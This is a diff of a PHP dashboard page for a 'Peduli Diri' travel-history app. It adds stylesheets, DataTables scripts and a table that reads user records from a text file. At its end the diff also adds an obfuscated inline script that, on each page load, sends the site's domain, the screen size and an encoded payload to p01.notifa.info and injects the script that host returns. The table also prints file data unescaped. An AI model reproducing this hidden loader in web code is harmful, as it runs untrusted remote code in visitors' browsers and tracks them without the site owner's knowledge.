@@ -11,24 +11,23 @@ if(empty( $_SESSION['nik'])){ ?>
 <html lang="en">
 
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="Content-Language" content="en">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-    <title>Dashboard - Peduli Diri</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no" />
-    <meta name="description" content="Highly configurable boxes best used for showing numbers in an user friendly way.">
-    <meta name="msapplication-tap-highlight" content="no">
-    <!--
-    =========================================================
-    * ArchitectUI HTML Theme Dashboard - v1.0.0
-    =========================================================
-    * Product Page: https://dashboardpack.com
-    * Copyright 2019 DashboardPack (https://dashboardpack.com)
-    * Licensed under MIT (https://github.com/DashboardPack/architectui-html-theme-free/blob/master/LICENSE)
-    =========================================================
-    * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-    -->
+<link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+    <!-- simplebar CSS-->
+    <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
+    <!-- Bootstrap core CSS-->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
+    <!--Data Tables -->
+    <link href="assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
+    <link href="assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
+    <!-- animate CSS-->
+    <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
+    <!-- Icons CSS-->
+    <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
+    <!-- Sidebar CSS-->
+    <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
+    <!-- Custom Style-->
+    <link href="assets/css/app-style.css" rel="stylesheet"/>
+
 <link href="main.css" rel="stylesheet"></head>
 <body>
     <div class="app-container app-theme-white body-tabs-shadow fixed-sidebar fixed-header">
@@ -357,18 +356,106 @@ if(empty( $_SESSION['nik'])){ ?>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                    <div class="app-wrapper-footer">
-                        <div class="app-footer">
-                            <div class="app-footer__inner">
-                                <div class="app-footer-left">
-                                     <a href="">&copy; Mohammad Reihan Zakya Alawi </a>
+                        <div class="row">
+                            <div class="col-lg-12">
+                                <div class="card">
+                                    <div class="card-header"><i class="fa fa-table"></i>Riwayat Perjalanan</div>
+                                        <div class="card-body">
+                                            <div class="table-responsive">
+                                                <table id="example" class="table table-bordered">
+                                                    <thead>
+                                                        <tr>
+                                                            <th>Tanggal</th>
+                                                            <th>Waktu</th>
+                                                            <th>Lokasi</th>
+                                                            <th>Suhu Tubuh</th>
+                                                        </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                        <?php
+                                                        $data = file('catatan.txt',FILE_IGNORE_NEW_LINES);
+                                                        $user = $_SESSION['nik']."|".$_SESSION['nama_lengkap'];
+                                                    foreach($data as $value){
+                                                        $a =explode("|",$value);
+                                                        @$b =$a['0']."|".$a['1'];
+                                                        if($b==$user){
+
+                                                        ?>
+                                                        <tr>
+                                                            <td><?= $a['2'];?></td>
+                                                            <td><?= $a['3'];?></td>
+                                                            <td><?= $a['4'];?></td>
+                                                            <td><?= $a['5'];?></td>
+                                                        </tr>
+                                                        <?php }} ?>
+                                                    </tbody>  
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>  
+                        </div>
+                    </div>   
+                    <footer class="footer pt-0">
+                        <div class="row align-items-center justify-content-lg-between ">
+                            <div class="col-lg-6">
+                                <div class="copyright text-center text-lg-left text-muted">
+                                &copy; 2022 <a href="" class="font-weight-bold ml-1" target="_blank">Mohammad Reihan Zakya Alawi</a>
                                 </div>
                             </div>
                         </div>
-                    </div>    
+                    </footer> 
                 </div>
+              
         </div>
-    </div>
-<script type="text/javascript" src="assets/scripts/main.js"></script></body>
+    <script type="text/javascript" src="assets/scripts/main.js"></script>
+
+    <!-- Bootstrap core JavaScript-->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/popper.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+
+    <!-- simplebar js -->
+    <script src="assets/plugins/simplebar/js/simplebar.js"></script>
+    <!-- waves effect js -->
+    <script src="assets/js/waves.js"></script>
+    <!-- sidebar-menu js -->
+    <script src="assets/js/sidebar-menu.js"></script>
+    <!-- Custom scripts -->
+    <script src="assets/js/app-script.js"></script>
+
+    <!--Data Tables js-->
+    <script src="assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
+    <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
+
+    <script>
+    $(document).ready(function() {
+    //Default data table
+    $('#default-datatable').DataTable();
+
+
+    var table = $('#example').DataTable( {
+        lengthChange: false,
+        buttons: [ 'copy', 'excel', 'pdf', 'print' ]
+    } );
+
+    table.buttons().container()
+        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
+    
+    } );
+
+    </script>
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+
 </html>
